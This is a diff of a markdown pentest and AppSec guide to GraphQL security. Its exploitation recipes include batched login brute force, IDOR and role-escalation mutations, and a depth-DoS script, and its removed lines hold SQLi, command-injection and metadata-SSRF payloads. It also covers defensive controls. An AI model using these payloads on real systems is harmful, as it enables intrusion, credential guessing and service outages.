@@ -1,24 +1,52 @@
-﻿# GraphQL
+﻿# GraphQL API Security
 
-> GraphQL is a query language and runtime for APIs. Unlike REST, it exposes a single endpoint (`/graphql`) and a schema that clients can introspect. Misconfigurations in GraphQL expose the entire data model, allow unauthorized queries (IDOR, mass assignment), and enable DoS via deeply nested queries. This file covers detection, enumeration, exploitation, and OSCP evidence.
+> API category - 03 GraphQL
+> GraphQL is a query language and runtime for APIs. A single endpoint (/graphql), a self-describing schema, and client-controlled query shape.
+> The schema is the attack surface: introspection exposes it, batching amplifies it, and nested queries can take it down.
 >
 > Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.
 
+---
+
 ## Table of Contents
 
-1. [Detection](#1-detection)
-2. [GraphQL Basics](#2-graphql-basics)
-3. [Enumeration](#3-enumeration)
-4. [Attack Surface Map](#4-attack-surface-map)
-5. [Vulnerabilities and Exploitation](#5-vulnerabilities-and-exploitation)
-6. [Tooling](#6-tooling)
-7. [Post-Exploitation](#7-post-exploitation)
-8. [OSCP Notes](#8-oscp-notes)
-9. [References](#9-references)
+- [1. What GraphQL Is](#1-what-graphql-is)
+- [2. Detection](#2-detection)
+- [3. Enumeration](#3-enumeration)
+- [4. Attack Surface Map](#4-attack-surface-map)
+- [5. Common Variants](#5-common-variants)
+- [6. Exploitation Recipes](#6-exploitation-recipes)
+- [7. Post-Exploitation](#7-post-exploitation)
+- [8. Risk Context (AppSec)](#8-risk-context-appsec)
+- [9. Root Causes (AppSec)](#9-root-causes-appsec)
+- [10. Preventive Controls (AppSec)](#10-preventive-controls-appsec)
+- [11. Detection Controls (AppSec)](#11-detection-controls-appsec)
+- [12. Verification (AppSec)](#12-verification-appsec)
+- [13. OSCP Notes](#13-oscp-notes)
+- [14. Production Notes](#14-production-notes)
+- [15. References](#15-references)
 
 ---
 
-## 1. Detection
+## 1. What GraphQL Is
+
+GraphQL is a specification for a typed API. The server defines a schema with types, queries, mutations, and subscriptions. The client sends a single query document describing exactly what it wants.
+
+**Key differences from REST:**
+
+- One endpoint (`/graphql`) instead of many URLs.
+- The client controls the response shape - not the server.
+- The schema is introspectable (unless disabled).
+- Everything is a POST (usually); GET is possible but less common.
+- Authorization is per-field or per-resolver, not per-route.
+
+**Practical consequence for pentest:** the attack surface is the schema, not the URL space. Once you have the schema, the entire data model is mapped. The next question is: which fields and mutations lack an authorization check?
+
+**Common stacks:** Apollo Server (Node), graphql-ruby (Rails), graphene (Python), Strawberry (Python), gqlgen (Go), Hot Chocolate (.NET), graphql-java.
+
+---
+
+## 2. Detection
 
 GraphQL endpoints are typically at:
 
@@ -27,370 +55,172 @@ GraphQL endpoints are typically at:
 
 Detection signals:
 
-- Response to `GET /graphql` returns `{"errors":[{"message":"..."}]}` or GraphQL-specific JSON.
-- Response to `POST /graphql` with `{"query":"{__typename}"}` returns `{"data":{"__typename":"Query"}}`.
-- Response headers: `X-Powered-By: express-graphql`, `apollo-server`, etc.
-- WebSocket endpoint `/graphql` with `graphql-ws` or `subscriptions-transport-ws` subprotocol.
+- `GET /graphql` returns `{"errors":[{"message":"..."}]}` or GraphQL-specific JSON.
+- Response to a malformed query contains `"errors"` array with GraphQL-shaped messages.
+- `POST /graphql` with `{"query":"{__typename}"}` returns `{"data":{"__typename":"Query"}}`.
+- Response headers include `X-Apollo-*`, or the body contains `"extensions"`.
 
 ### Quick detection
 
 ```bash
 # GET probe
-curl -s -i $TARGET/graphql | head -20
+curl -s -i "$TARGET/graphql"
 
-# POST probe - ask for the root type
-curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
-
-# Introspection probe
-curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name}}}"}'
+# Minimal valid query (works on most schemas)
+curl -s -X POST "$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__typename}"}'
 ```
 
-Expected output (successful GraphQL):
+Expected output:
 
-```json
+```text
 {"data":{"__typename":"Query"}}
 ```
 
-Expected output (introspection enabled):
-
-```json
-{"data":{"__schema":{"types":[{"name":"Query"},{"name":"User"},{"name":"Post"}]}}}
-```
-
-### Quick reference table
-
-| Signal | Meaning | Next step |
-|--------|---------|-----------|
-| `{"data":{"__typename":"Query"}}` | Valid GraphQL endpoint | Run introspection |
-| `{"errors":[{"message":"GraphQL ..."}]}` | GraphQL present, misconfigured | Enumerate schema |
-| Introspection returns types | Introspection enabled | Dump full schema |
-| Introspection disabled | Hardened | Fall back to field guessing |
-| `/graphiql` responds 200 | IDE enabled | Use browser to explore |
-| `subscriptions-transport-ws` in WS | Subscriptions | Test auth on WS |
-
----
-
-## 2. GraphQL Basics
-
-### 2.1 Operations
-
-Three operation types: `query`, `mutation`, `subscription`.
-
-```graphql
-query GetUser($id: ID!) {
-  user(id: $id) {
-    id
-    username
-    email
-  }
-}
-
-mutation CreatePost($input: PostInput!) {
-  createPost(input: $input) {
-    id
-    title
-  }
-}
-
-subscription OnNewPost {
-  postAdded {
-    id
-    title
-  }
-}
-```
-
-### 2.2 Introspection
-
-The `__schema`, `__type`, `__typename` meta-fields expose the schema.
-
-```graphql
-{
-  __schema {
-    queryType { name }
-    mutationType { name }
-    subscriptionType { name }
-    types {
-      name
-      kind
-      fields {
-        name
-        type { name kind ofType { name kind } }
-      }
-    }
-  }
-}
-```
-
-### 2.3 Error-based discovery
-
-If introspection is disabled, invalid queries reveal field names:
-
-```graphql
-{
-  usr {
-    id
-  }
-}
-```
-
-Response:
-
-```json
-{"errors":[{"message":"Cannot query field \"usr\" on type \"Query\". Did you mean \"user\"?"}]}
-```
-
-The `Did you mean` hint is a goldmine for field enumeration.
+`__typename` is a meta-field available on every type. If it answers, the endpoint is GraphQL.
 
 ---
 
 ## 3. Enumeration
 
-### 3.1 Introspection (if enabled)
+### Introspection
+
+GraphQL ships with a built-in query that returns the entire schema. If introspection is enabled in production, the whole data model is public.
 
 ```bash
-# Full introspection dump with graphql-cop or InQL
-python3 -m pip install graphql-cop
-graphql-cop -t $TARGET/graphql
-
-# Or inql (Burp extension) for GUI
+curl -s -X POST "$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"}'
 ```
 
-Save introspection result:
+### Full introspection to SDL
 
 ```bash
-curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"}' | jq . > schema.json
+# Using graphql-cli / get-graphql-schema
+npm install -g get-graphql-schema
+get-graphql-schema "$TARGET/graphql" > schema.graphql
 ```
 
-### 3.2 Field guessing (introspection disabled)
-
-Use wordlists of common field names: `user`, `users`, `me`, `admin`, `login`, `auth`, `password`, `email`, `role`, `flag`, `secret`, `token`, `apikey`, `debug`.
+Or via a Python one-liner:
 
 ```bash
-while read -r field; do
-  resp=$(curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d "{\"query\":\"{$field{__typename}}\"}")
-  if echo "$resp" | grep -q '"__typename"'; then
-    echo "HIT: $field -> $resp"
-  fi
-done < graphql-fields.txt
+python3 -c "
+import requests, json
+q = {'query':'{__schema{queryType{name} mutationType{name} subscriptionType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}} type{name kind ofType{name kind}}}}}}'}
+r = requests.post('$TARGET/graphql', json=q)
+print(json.dumps(r.json(), indent=2))
+"
 ```
 
-Sample `graphql-fields.txt`:
+### If introspection is disabled
 
-```text
-user
-users
-me
-viewer
-admin
-admins
-login
-register
-resetPassword
-flag
-secret
-token
-apikey
-debug
-systemInfo
-config
+Field-name guessing (a.k.a. "GraphQL fuzzing"):
+
+```bash
+# Try common field names on the Query type
+for f in users user me admin config health version debug; do
+  curl -s -X POST "$TARGET/graphql" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\":\"{ $f { __typename } }\"}" | head -c 200
+  echo
+done
 ```
 
-### 3.3 Argument enumeration via error hints
+Errors of the form `Cannot query field "X" on type "Query"` distinguish existing from non-existing fields. The error message itself is a schema oracle.
 
-```graphql
-{
-  user {
-    id
-  }
-}
-```
+### Tools
 
-Response hint:
-
-```json
-{"errors":[{"message":"Field \"user\" argument \"id\" of type \"ID!\" is required, but it was not provided."}]}
-```
-
-This reveals required arguments and their types.
-
-### 3.4 GraphQL IDE (GraphiQL)
-
-If `/graphiql` or `/graphql/console` is accessible, the schema browser exposes everything interactively. Often left enabled in dev/staging.
-
-### 3.5 Schema in Apollo Studio
-
-Check for `apollo-server` traces:
-
-- `/.well-known/apollo/server-health`.
-- `apollo-server-landing-page` HTML at the root.
+- **graphql-voyager** - visual schema explorer (run locally against the SDL).
+- **InQL** (Burp extension) - automated introspection + query generation.
+- **graphw00f** - fingerprint the GraphQL engine (Apollo, graphql-ruby, etc.).
+- **clairvoyance** - schema reconstruction when introspection is disabled.
 
 ---
 
 ## 4. Attack Surface Map
 
-| Attack | Condition | Impact |
-|--------|-----------|--------|
-| Introspection enabled | Schema exposed | Full data model leak |
-| No auth on schema | Introspection without auth | Attack surface exposed to anonymous |
-| IDOR in arguments | Sequential IDs | Access other users' data |
-| Mass assignment | Mutation accepts extra fields | Role escalation |
-| Missing authorization | Query without auth check | Data leak |
-| Nested query DoS | No depth limit | DoS |
-| Alias overloading | No complexity limit | DoS |
-| Batching | No limit | Brute-force, DoS |
-| Injection in arguments | Unsanitized input | SQLi / NoSQLi / command injection |
-| Debug/GraphiQL in prod | IDE enabled | Direct exploitation |
-| Field suggestions | `Did you mean` leaks | Schema leak |
-| SSRF via resolver | Resolver fetches URL | SSRF |
-| Field-level auth bypass | Auth only on some fields | Data leak |
+| Surface | What to test |
+|---------|--------------|
+| Introspection | Enabled in production? `/graphql` answers `__schema`? |
+| Query depth | No limit -> nested `{ user { posts { comments { author { posts { ... } } } } } }` |
+| Query complexity | No cost limit -> wide queries with aliases |
+| Batching | Array of queries in one POST -> brute-force amplification |
+| Aliases | Same field many times with different args -> bypass rate limit |
+| Field-level authz | `me { email }` works but `users { email }` also works? |
+| Mutations | `updateUser`, `deleteUser`, `setRole` - who can call? |
+| Subscriptions | WebSocket transport - does authz apply per subscription? |
+| Errors | Detailed messages leak schema + stack traces |
+| GET method | Some endpoints allow GET with `?query=` - CSRF vector |
 
 ---
 
-## 5. Vulnerabilities and Exploitation
+## 5. Common Variants
 
-### 5.1 Introspection enabled (schema disclosure)
+### 5.1 Introspection Enabled
 
-**Root cause:** GraphQL servers ship with introspection enabled by default. In production, this exposes the full schema.
+The schema is public. Full data model, all mutations, all arguments.
 
-**Exploit:**
+Detection:
 
 ```bash
-# Dump schema
-curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name fields{name type{name kind}}}}}"}' | jq .
-
-# Better: use graphql-cop or InQL for readable output
-graphql-cop -t $TARGET/graphql
+curl -s -X POST "$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{queryType{name}}}"}'
 ```
 
-Expected output:
+If the response contains `"queryType"`, introspection is on.
 
-```json
-{
-  "data": {
-    "__schema": {
-      "types": [
-        {"name": "Query", "fields": [{"name": "user"},{"name": "users"},{"name": "admin"}]},
-        {"name": "User", "fields": [{"name": "id"},{"name": "email"},{"name": "password"}]}
-      ]
-    }
-  }
-}
-```
+### 5.2 Missing Field-Level Authorization
 
-> [!IMPORTANT]
-> OSCP report: screenshot the introspection query and the returned schema (types + fields). Highlight sensitive fields (`password`, `token`, `admin`, `flag`).
-
-**Mitigation:** disable introspection in production; keep it in dev only.
-
----
-
-### 5.2 IDOR via arguments
-
-**Root cause:** Query arguments like `id` are used without ownership checks.
-
-**Exploit:**
-
-```graphql
-query {
-  user(id: 2) {
-    id
-    username
-    email
-  }
-}
-```
-
-Change `id: 1` (your own) to `id: 2`, `id: 3`, etc. to enumerate.
-
-Batch enumeration:
+The schema defines `users` and `me`. The resolver for `users` should reject non-admins, but it does not.
 
 ```bash
-for id in $(seq 1 100); do
-  resp=$(curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d "{\"query\":\"{user(id:$id){id username email}}\"}")
-  echo "id=$id -> $resp"
-done
+# Allowed
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"{ me { id email } }"}'
+
+# Should be forbidden, often is not
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"{ users { id email role } }"}'
 ```
 
-> [!IMPORTANT]
-> OSCP report: screenshot the query for your own ID, then the query for another user's ID returning their data.
+### 5.3 Batching (Brute Force Amplification)
 
-**Mitigation:** enforce authorization per-resolver; never trust client-supplied IDs.
+A single HTTP request can contain an array of queries. Rate limiters that count HTTP requests are bypassed.
 
----
-
-### 5.3 Mass assignment via mutations
-
-**Root cause:** Mutation input types accept fields the developer did not intend to be user-controllable (e.g. `role`, `isAdmin`, `verified`).
-
-**Exploit:**
-
-```graphql
-mutation {
-  updateUser(input: {
-    id: 1
-    username: "attacker"
-    role: "admin"
-  }) {
-    id
-    username
-    role
-  }
-}
+```bash
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -d '[{"query":"mutation{login(user:\"admin\",pass:\"pass1\"){token}}"},
+       {"query":"mutation{login(user:\"admin\",pass:\"pass2\"){token}}"},
+       {"query":"mutation{login(user:\"admin\",pass:\"pass3\"){token}}"}]'
 ```
 
-If the server accepts `role`, privilege escalation.
+1000 logins in one HTTP request -> 1 rate-limit tick.
 
-> [!IMPORTANT]
-> OSCP report: screenshot the mutation request with the extra field and the response showing the elevated role.
+### 5.4 Alias-Based Rate Limit Bypass
 
-**Mitigation:** whitelist allowed fields in input types; strip unexpected fields.
+Same trick without the array syntax: use aliases to repeat the same field.
 
----
-
-### 5.4 Missing authorization on query
-
-**Root cause:** Some fields do not enforce auth. Even if login is required, an anonymous or low-privilege user can access sensitive fields.
-
-**Exploit:**
-
-```graphql
-query {
-  allUsers {
-    id
-    email
-    password
-  }
-}
+```bash
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"mutation{a:login(user:\"admin\",pass:\"p1\"){token} b:login(user:\"admin\",pass:\"p2\"){token} c:login(user:\"admin\",pass:\"p3\"){token}}"}'
 ```
 
-Test anonymously (no `Authorization` header) and with a low-privilege token.
+### 5.5 Depth-Based DoS
 
-> [!IMPORTANT]
-> OSCP report: screenshot the query with a low-privilege token returning sensitive data.
-
-**Mitigation:** field-level authorization; use a directive like `@auth` on every protected field.
-
----
-
-### 5.5 Nested query DoS (resource exhaustion)
-
-**Root cause:** No query depth / complexity limit. Recursive relationships (`user -> posts -> author -> posts -> ...`) explode.
-
-**Exploit:**
+No depth limit -> a query that walks a cycle explodes in cost.
 
 ```graphql
 query {
   user(id: 1) {
     posts {
-      author {
-        posts {
-          author {
-            posts {
+      comments {
+        author {
+          posts {
+            comments {
               author {
-                posts {
-                  author { id }
-                }
+                posts { id }
               }
             }
           }
@@ -401,280 +231,209 @@ query {
 }
 ```
 
-Send a deeply nested query. If the server hangs or returns a timeout, DoS is confirmed.
+### 5.6 Mutation Authorization Gaps
 
-> [!IMPORTANT]
-> OSCP report: screenshot the deeply nested query and the timeout/error response. **Do NOT run this against production** - it will cause an outage.
-
-**Mitigation:** depth limit (e.g. `maxDepth=7`), complexity scoring, query cost analysis, timeout per request.
-
----
-
-### 5.6 Alias overloading
-
-**Root cause:** No limit on the number of aliases. Attackers duplicate expensive fields thousands of times in one query.
-
-**Exploit:**
-
-```graphql
-query {
-  a1: expensiveField
-  a2: expensiveField
-  a3: expensiveField
-  # ... repeated 1000 times
-}
-```
-
-> [!IMPORTANT]
-> OSCP report: screenshot the alias-batched query and the response time/latency.
-
-**Mitigation:** limit aliases per query; complexity scoring counts each alias.
-
----
-
-### 5.7 Batching (brute-force / DoS)
-
-**Root cause:** The server accepts an array of queries in one HTTP request. Useful for brute-forcing passwords, OTPs, or tokens without rate-limiting.
-
-**Exploit:**
+Read-only check passes, but the mutation is unguarded.
 
 ```bash
-# Array batching (Apollo)
-curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '[
-  {"query":"mutation{login(user:\"admin\",pass:\"123456\"){token}}"},
-  {"query":"mutation{login(user:\"admin\",pass:\"password\"){token}}"},
-  {"query":"mutation{login(user:\"admin\",pass:\"admin\"){token}}"}
-]'
+# Read own profile (expected)
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"query{me{id email role}}"}'
 
-# Alias batching
-curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"mutation{a:login(user:\"admin\",pass:\"123456\"){token} b:login(user:\"admin\",pass:\"password\"){token}}"}'
+# Change own role (should be forbidden)
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"mutation{updateUser(id:1,role:\"admin\"){id role}}"}'
 ```
 
-> [!IMPORTANT]
-> OSCP report: screenshot the batched request and any successful login (rate-limit bypass).
+### 5.7 Verbose Errors
 
-**Mitigation:** disable batching, or limit batch size; rate-limit per query, not per HTTP request.
+Detailed errors leak the schema, resolvers, and sometimes stack traces.
+
+```bash
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"{ nonExistentField }"}'
+```
+
+Expected error pattern:
+
+```text
+Cannot query field "nonExistentField" on type "Query". Did you mean "nonExistent"?
+```
+
+The `Did you mean` suggestion is a field-name oracle.
 
 ---
 
-### 5.8 Injection in arguments (SQLi / NoSQLi / command injection)
+## 6. Exploitation Recipes
 
-**Root cause:** Resolvers pass user input directly to backend queries.
-
-**SQLi:**
-
-```graphql
-query {
-  user(id: "1' OR '1'='1") {
-    id
-    username
-  }
-}
-```
-
-**NoSQLi (MongoDB):**
-
-```graphql
-query {
-  user(filter: {username: {$ne: null}, password: {$ne: null}}) {
-    id
-    username
-  }
-}
-```
-
-**Command injection:**
-
-```graphql
-mutation {
-  ping(host: "127.0.0.1; id") {
-    output
-  }
-}
-```
-
-> [!IMPORTANT]
-> OSCP report: screenshot the malicious argument value, the resulting query (if visible), and the injected output (e.g. `uid=33(www-data)`).
-
-**Mitigation:** parameterized queries; input validation; never pass raw GraphQL args to shell.
-
----
-
-### 5.9 SSRF via resolver
-
-**Root cause:** A resolver fetches a URL supplied by the user (e.g. avatar import, webhook, URL preview).
-
-**Exploit:**
-
-```graphql
-mutation {
-  importAvatar(url: "http://169.254.169.254/latest/meta-data/") {
-    url
-    preview
-  }
-}
-```
-
-Test internal hosts: `http://127.0.0.1:8080`, `http://169.254.169.254/`, `http://[::1]/`.
-
-> [!IMPORTANT]
-> OSCP report: screenshot the mutation with the internal URL and the returned metadata/response.
-
-**Mitigation:** URL whitelist; block private IP ranges; use a metadata-blocking proxy.
-
----
-
-### 5.10 Field suggestion leak (introspection disabled)
-
-When introspection is off, some servers still return `Did you mean` hints.
-
-**Exploit:**
+### 6.1 Full introspection dump
 
 ```bash
-for field in usr uzer user admin adminn flag flg; do
-  resp=$(curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d "{\"query\":\"{$field{__typename}}\"}")
-  echo "$field -> $resp"
-done
+get-graphql-schema "$TARGET/graphql" > schema.graphql
+grep -E "type (Query|Mutation)" schema.graphql
 ```
 
-Response:
-
-```json
-{"errors":[{"message":"Cannot query field \"usr\" on type \"Query\". Did you mean \"user\"?"}]}
-```
-
-Parse the hints to reconstruct the schema.
-
-**Mitigation:** disable suggestions (`didYouMean: false` in Apollo, or equivalent).
-
----
-
-### 5.11 GraphiQL / Playground exposed
-
-**Root cause:** Dev IDE enabled in production. Provides schema browser + query editor.
-
-**Exploit:** visit `http://target/graphiql` in a browser. If it loads, use it to explore and exploit.
-
-> [!IMPORTANT]
-> OSCP report: screenshot the GraphiQL page URL and the schema browser showing the types/fields.
-
-**Mitigation:** disable IDE endpoints in production; serve only at internal addresses.
-
----
-
-## 6. Tooling
-
-### graphql-cop
+### 6.2 IDOR through a field
 
 ```bash
-python3 -m pip install graphql-cop
-graphql-cop -t $TARGET/graphql
+# Own data
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query":"{user(id:1042){email}}"}'
+
+# Peer data
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query":"{user(id:1043){email}}"}'
 ```
 
-Tests introspection, GET/POST, batch, alias, depth, suggestions.
-
-### InQL (Burp extension)
-
-- Install via BApp Store.
-- Right-click on a GraphQL request -> Send to InQL.
-- Generates schema + query templates.
-
-### graphql-voyager
-
-Visualize the schema:
+### 6.3 Mass assignment through a mutation
 
 ```bash
-# Save schema first
-curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name kind fields{name type{name kind}}}}}"}' > schema.json
-
-# Paste into https://apis.guru/graphql-voyager/
+curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query":"mutation{updateMe(input:{email:\"new@example.com\",role:\"admin\"}){id role}}"}'
 ```
 
-### Altair GraphQL Client
-
-Desktop app for interactive GraphQL. Supports environments, subscriptions, file upload.
-
-### clairvoyance
-
-Reconstruct schema when introspection is disabled, using field suggestion errors.
+### 6.4 Batching brute force
 
 ```bash
-python3 -m pip install clairvoyance
-clairvoyance $TARGET/graphql -o schema.json -w wordlist.txt
+python3 - <<'PY'
+import requests, json
+url = "TARGET/graphql"
+pw_list = ["pass1","pass2","pass3"]
+batch = [{"query": f'mutation{{login(user:"admin",pass:"{p}"){{token}}}}'} for p in pw_list]
+r = requests.post(url, json=batch)
+print(r.text)
+PY
 ```
 
-### graphql-path-enum
+### 6.5 Depth DoS (LAB only)
 
-Enumerate paths between types.
+Do not run against production. In a lab:
 
 ```bash
-python3 -m pip install graphql-path-enum
-graphql-path-enum -i schema.json -t User
+python3 - <<'PY'
+import requests
+url = "TARGET/graphql"
+q = "query { " + "user { posts { comments { author { " * 20 + "id" + " } } } }" * 20 + " }"
+r = requests.post(url, json={"query": q}, timeout=60)
+print(r.status_code, len(r.text))
+PY
+```
+
+### 6.6 Introspection-off schema reconstruction
+
+```bash
+clairvoyance -o schema.graphql -w /usr/share/seclists/Discovery/Web-Content/graphql.txt "$TARGET/graphql"
 ```
 
 ---
 
 ## 7. Post-Exploitation
 
-After gaining access:
+After a GraphQL foothold:
 
-1. **Dump all users:** `query { allUsers { id email role } }`.
-2. **Look for admin/flag fields:** `admin`, `flag`, `secret`, `config`.
-3. **Trigger mutations:** `createUser`, `updateRole`, `deleteUser`.
-4. **Check file upload mutations:** `uploadFile`, `importAvatar`.
-5. **Enumerate subscriptions:** WebSocket channel may leak events.
-6. **Extract tokens:** some queries return `refreshToken`, `apiKey`.
-7. **Pivot to REST:** if the app also exposes REST endpoints, reuse the token.
-
-```graphql
-# Enumerate everything suspicious
-query {
-  me { id username email role apiKey }
-  allUsers { id username email role }
-  config { dbHost dbUser dbPass }
-  systemInfo { version env }
-}
-```
+- Dump the schema again with the new token - reachable types change.
+- Enumerate mutations the UI never calls (`deleteUser`, `setRole`, `createApiKey`).
+- Check subscriptions over WebSocket - auth is often checked at connection time, not per message.
+- Look for `__schema.types[].fields[].args` - argument names hint at internal endpoints (`internalId`, `debug`).
+- Check for `@deprecated` fields - they still resolve.
 
 ---
 
-## 8. OSCP Notes
+## 8. Risk Context (AppSec)
 
-> [!IMPORTANT]
-> OSCP report evidence for GraphQL:
-> - Screenshot the introspection query and the returned schema (full types + fields).
-> - Screenshot the exploit query (IDOR, mass assignment, injection).
-> - Screenshot the response with sensitive data (user list, admin token).
-> - For DoS: screenshot the nested query and the timeout (do NOT test on production).
-> - Include timestamps.
-
-> [!IMPORTANT]
-> If introspection is disabled, use `clairvoyance` to reconstruct the schema. Screenshot the reconstructed schema and the field-suggestion errors that revealed it.
-
-> [!IMPORTANT]
-> For batched brute-force, screenshot the batched request and the successful credential match. This is the evidence for rate-limit bypass.
-
-**Common OSCP pitfalls:**
-
-- Some endpoints only accept `POST`. If `GET` returns 405, retry with `POST`.
-- Introspection may be partially disabled (only `__schema` is blocked). Try `__type` directly: `{__type(name:"User"){name fields{name}}}`.
-- The `graphql` endpoint may be behind auth; try with/without `Authorization`.
-- Subscriptions use WebSocket - use `wscat` or a Burp WS tab.
-- Batching is not universal; check whether the server accepts arrays or only alias batches.
+- **Schema exposure:** a single endpoint that documents the entire data model is a design choice. In production, this is often acceptable for internal APIs, but rarely for public ones.
+- **Authorization is per-resolver:** unlike REST (where a route guard covers the whole endpoint), GraphQL authorization must be repeated in every resolver. One missed resolver = one BOLA.
+- **Batching amplifies everything:** brute force, enumeration, password spraying - all scale linearly with the array size in a single HTTP request.
+- **Depth is client-controlled:** a client can send a query the developer never imagined. Without a depth or cost limit, the server's resource consumption is client-decided.
 
 ---
 
-## 9. References
+## 9. Root Causes (AppSec)
 
-- GraphQL spec: https://spec.graphql.org/
-- Introspection: https://graphql.org/learn/introspection/
-- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
-- PortSwigger GraphQL: https://portswigger.net/web-security/graphql
-- HackTricks GraphQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
-- graphql-cop: https://github.com/dolevf/graphql-cop
-- InQL: https://github.com/doyensec/inql
-- clairvoyance: https://github.com/nikitastupin/clairvoyance
-- graphql-voyager: https://github.com/graphql-kit/graphql-voyager
-- CVE-2019-13598 (GraphQL introspection in prod): https://nvd.nist.gov/vuln/detail/CVE-2019-13598
-- CVE-2022-31836 (GraphQL DoS via batching): https://nvd.nist.gov/vuln/detail/CVE-2022-31836
-- CVE-2023-25653 (graphql-java DoS): https://nvd.nist.gov/vuln/detail/CVE-2023-25653
+| Root cause | Where it originates |
+|------------|---------------------|
+| Introspection on in prod | Same config as dev, no environment split |
+| Field-level authz missing | Route-level middleware pattern does not map to GraphQL |
+| Batching allowed | Default in Apollo Server, not disabled |
+| No depth limit | Schema design without cycle analysis |
+| No complexity limit | Field costs not annotated |
+| Aliases not deduplicated | Rate limiter counts HTTP requests, not fields |
+| Error verbosity | `NODE_ENV` not set to `production` |
+| GET method allowed | Convenience for the GraphiQL IDE |
+
+---
+
+## 10. Preventive Controls (AppSec)
+
+- **Disable introspection in production.** `ApolloServer({ introspection: process.env.NODE_ENV !== 'production' })`. Same for `graphql-ruby`, `graphene`, `gqlgen`.
+- **Depth limit.** `graphql-depth-limit` (Node), `graphql-query-complexity` (Ruby/Python). Reject queries above the threshold.
+- **Complexity/cost limit.** Annotate fields with a cost. Reject above the budget.
+- **Batching:** either disable array-batching entirely, or rate-limit by query count, not HTTP count.
+- **Field-level authorization:** use a directive (`@auth(requires: ADMIN)`) or a middleware (`graphql-shield`, `graphql-guard`).
+- **Disable GraphiQL in production.** It exposes the explorer and often the schema.
+- **Disable GET.** POST only, with `Content-Type: application/json`.
+- **Error responses:** generic to the client, detailed in the server log.
+- **Subscription auth:** check authorization on every message, not just at connection time.
+
+---
+
+## 11. Detection Controls (AppSec)
+
+| Signal | Where to look |
+|--------|---------------|
+| Introspection queries in production | Server logs (`__schema`, `__type`) |
+| Deeply nested queries | Query-shape analysis in logs |
+| Batching arrays | Request body size + array detection |
+| Aliases repeating the same field | Query AST analysis |
+| Mutation names never seen in the UI | Logs vs UI telemetry |
+| Errors with `Did you mean` in responses | Client-visible errors |
+| GET requests to `/graphql` | Gateway logs |
+
+---
+
+## 12. Verification (AppSec)
+
+- **Introspection:** POST `{__schema{queryType{name}}}` -> expect `{"errors":[{"message":"Introspection is disabled"}]}` or a 400.
+- **Depth:** a 30-level nested query -> expect 400 or a timeout error, never a 200.
+- **Complexity:** a 100-alias query -> expect 400.
+- **Batching:** array with 100 logins -> expect one rate-limit tick, not 100.
+- **Field authz:** non-admin calls `users { email }` -> expect 403 (or field-level null + error).
+- **Mutation authz:** non-admin calls `updateUser(role: "admin")` -> expect 403.
+- **GET:** `GET /graphql?query={__typename}` -> expect 405.
+- **Error verbosity:** send a malformed query -> response contains no stack trace, no `Did you mean`.
+
+---
+
+## 13. OSCP Notes
+
+GraphQL boxes on OSCP labs tend to expose:
+
+- An endpoint at `/graphql` with introspection on. Dump the schema, read the flag field.
+- A mutation that writes to a file or sends an email - used to pivot.
+- A subscription with no per-message auth - used to intercept other users' data.
+
+For the report: screenshot the introspection query and the response that shows the target field. Screenshot the mutation that proves the impact (write or privilege change).
+
+---
+
+## 14. Production Notes
+
+- **Do not run depth DoS against production.** It is a real DoS.
+- **Batching brute force trips lockout.** Test against a lab account, not a real one.
+- **Introspection dumps go into your report.** Treat the SDL as sensitive - it is the whole API map.
+- **Alias attacks bypass per-IP rate limits but not per-account.** Combine with account enumeration for full impact.
+
+---
+
+## 15. References
+
+- OWASP API Security Top 10:2023 - API4 (Unrestricted Resource Consumption), API8 (Security Misconfiguration) - https://owasp.org/API-Security/editions/2023/en/0x00-header/
+- GraphQL specification - https://spec.graphql.org/October2021/
+- OWASP GraphQL Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
+- PortSwigger GraphQL - https://portswigger.net/web-security/graphql
+- GraphQL security - https://github.com/dolevf/graphql-cheat-sheet
+- InQL (Burp extension) - https://github.com/doyensec/inql
+- clairvoyance - https://github.com/nikitastupin/clairvoyance
